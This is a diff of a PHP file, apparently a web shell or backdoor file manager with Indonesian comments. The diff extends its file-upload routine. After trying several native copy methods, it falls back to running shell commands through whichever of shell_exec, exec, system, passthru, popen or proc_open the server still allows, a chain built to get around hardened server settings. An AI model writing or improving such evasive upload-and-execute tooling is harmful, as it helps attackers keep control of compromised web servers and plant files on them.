@@ -927,62 +927,119 @@ else if($awal == 'hapus_folder' && isset($_POST['zf']) && is_string($_POST['zf']
 	$awal = 'dasar';
 }
 else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
-    // Fungsi upload yang dimodifikasi agar anti-0kb
     function smart_upload($fileKey, $targetDir) {
-        $res = [
-            'success' => false,
-            'method'  => '',
-            'message' => '',
-            'name'    => ''
-        ];
-
-        // Validasi dasar
+        $res = ['success' => false, 'method' => '', 'message' => '', 'name' => ''];
+        
+        // 1. Validasi Input
         if (!isset($_FILES[$fileKey]) || $_FILES[$fileKey]['error'] !== UPLOAD_ERR_OK) {
-            $res['message'] = 'Upload error code: ' . (isset($_FILES[$fileKey]['error']) ? $_FILES[$fileKey]['error'] : 'unknown');
+            $res['message'] = 'Upload error code: ' . ($_FILES[$fileKey]['error'] ?? 'unknown');
             return $res;
         }
 
         $filename = basename($_FILES[$fileKey]['name']);
         $tmp      = $_FILES[$fileKey]['tmp_name'];
-        
-        // Pastikan target dir memiliki slash di akhir
-        $pemisah = substr($targetDir, -1) !== "/" ? "/" : "";
-        $dest    = $targetDir . $pemisah . $filename;
+        $pemisah  = substr($targetDir, -1) !== "/" ? "/" : "";
+        $dest     = $targetDir . $pemisah . $filename;
 
-        // Cek apakah file tmp ada isinya
-        if (filesize($tmp) <= 0) {
-            $res['message'] = 'File tmp kosong (0kb). Upload gagal dari server.';
+        // 2. Validasi Source (Anti-0kb)
+        if (!file_exists($tmp) || filesize($tmp) <= 0) {
+            $res['message'] = 'File tmp kosong/hilang. Upload gagal dari server.';
             return $res;
         }
 
-        // Method 1: move_uploaded_file (Standar)
-        if (@move_uploaded_file($tmp, $dest)) {
-            $res['success'] = true;
-            $res['method'] = 'move_uploaded_file';
+        // --- A. METODE PHP NATIVE ---
+
+        // 1. Move Uploaded File
+        if (!$res['success'] && @move_uploaded_file($tmp, $dest)) {
+            $res['success'] = true; $res['method'] = 'move_uploaded_file';
         }
-        // Method 2: copy (Jika open_basedir mengizinkan akses tmp)
-        elseif (@copy($tmp, $dest)) {
-            $res['success'] = true;
-            $res['method'] = 'copy';
+
+        // 2. Copy
+        if (!$res['success'] && @copy($tmp, $dest)) {
+            $res['success'] = true; $res['method'] = 'copy';
         }
-        // Method 3: Baca konten dulu baru tulis (Mencegah write file kosong jika baca gagal)
-        else {
+
+        // 3. Rename
+        if (!$res['success'] && @rename($tmp, $dest)) {
+            $res['success'] = true; $res['method'] = 'rename';
+        }
+
+        // 4. Stream Copy (Fopen)
+        if (!$res['success']) {
+            $src = @fopen($tmp, 'rb');
+            $dst = @fopen($dest, 'wb');
+            if ($src && $dst) {
+                if (@stream_copy_to_stream($src, $dst)) {
+                    $res['success'] = true; $res['method'] = 'stream_copy';
+                }
+            }
+            @fclose($src); @fclose($dst);
+        }
+
+        // 5. File Get/Put Contents
+        if (!$res['success']) {
             $content = @file_get_contents($tmp);
             if ($content !== false && strlen($content) > 0) {
-                if (@file_put_contents($dest, $content) !== false) {
-                    $res['success'] = true;
-                    $res['method'] = 'content_read_write';
+                if (@file_put_contents($dest, $content)) {
+                    $res['success'] = true; $res['method'] = 'file_put_contents';
                 }
             }
         }
 
-        // Finalisasi
+        // --- B. METODE SYSTEM COMMAND (Fallback Multi-Fungsi) ---
+        if (!$res['success']) {
+            // Helper: Cari fungsi eksekusi yang aktif (exec, shell_exec, system, dll)
+            $run_cmd = function($cmd) {
+                if (function_exists('shell_exec')) { @shell_exec($cmd); return true; }
+                if (function_exists('exec')) { @exec($cmd); return true; }
+                if (function_exists('system')) { @system($cmd); return true; }
+                if (function_exists('passthru')) { @passthru($cmd); return true; }
+                if (function_exists('popen')) { 
+                    $fp = @popen($cmd, 'r'); 
+                    if($fp) { pclose($fp); return true; } 
+                }
+                if (function_exists('proc_open')) {
+                    $proc = @proc_open($cmd, [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']], $pipes);
+                    if (is_resource($proc)) { proc_close($proc); return true; }
+                }
+                return false;
+            };
+
+            // Command list: cp, mv, cat
+            $sys_cmds = [
+                ['cmd' => "cp " . escapeshellarg($tmp) . " " . escapeshellarg($dest), 'name' => 'cp'],
+                ['cmd' => "mv " . escapeshellarg($tmp) . " " . escapeshellarg($dest), 'name' => 'mv'],
+                ['cmd' => "cat " . escapeshellarg($tmp) . " > " . escapeshellarg($dest), 'name' => 'cat']
+            ];
+
+            foreach ($sys_cmds as $action) {
+                // Jalankan command menggunakan fungsi apapun yang tersedia
+                if ($run_cmd($action['cmd'])) {
+                    // Cek hasil segera
+                    if (file_exists($dest) && filesize($dest) > 0) {
+                        $res['success'] = true;
+                        $res['method'] = 'sys_' . $action['name'];
+                        break; // Berhenti jika berhasil
+                    }
+                }
+            }
+        }
+
+        // --- C. VERIFIKASI AKHIR ---
         if ($res['success']) {
-            @chmod($dest, 0644); // Fix permission agar bisa dibaca/edit
-            $res['name'] = $filename;
-            $res['message'] = "File uploaded successfully (<strong>{$res['method']}</strong>): " . htmlspecialchars($filename);
+            // Double check keberadaan dan ukuran file
+            clearstatcache();
+            if (file_exists($dest) && filesize($dest) > 0) {
+                @chmod($dest, 0644);
+                $res['name'] = $filename;
+                $res['message'] = "File uploaded successfully via <strong>{$res['method']}</strong>";
+            } else {
+                $res['success'] = false;
+                $res['message'] = "Metode {$res['method']} jalan, tapi file hasil 0kb/hilang.";
+                @unlink($dest);
+            }
         } else {
-            $res['message'] = "Gagal upload. Server mungkin membatasi akses ke folder tmp atau write permission.";
+            $res['message'] = "Gagal total. Semua metode (PHP & System) diblokir/gagal.";
         }
 
         return $res;
